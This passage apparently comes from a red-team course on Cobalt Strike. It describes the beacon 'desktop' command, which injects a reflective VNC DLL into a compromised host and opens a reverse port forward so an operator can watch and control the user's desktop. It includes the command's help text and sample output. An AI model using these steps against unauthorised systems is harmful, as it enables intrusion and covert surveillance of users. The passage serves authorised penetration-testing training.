Cobalt Strike can also inject an entire reflective VNC DLL to obtain remote control over the user's desktop.  This can be accessed using the `desktop` command, or **Explore > Desktop (VNC)**.

```powershell
beacon> help desktop
Use: desktop [pid] [x86|x64] [high|low]
     desktop [high|low]

Injects a VNC server onto the target and connects to it. You may specify
whether or not the session is high or low-quality.

beacon> desktop high
[*] Tasked beacon to spawn VNC server
[+] started port forward on 5117 to 127.0.0.1:5117
```

This will create a reverse port forward on the target, which the VNC DLL will use to tunnel traffic back to the team server.  The team server will also begin listening on the same port for the Cobalt Strike client to connect to.

The session is in 'view only' mode by default, but operators can take remote control over the keyboard and mouse using the buttons at the bottom of the window.  Closing this tab will automatically tear down the port bindings.
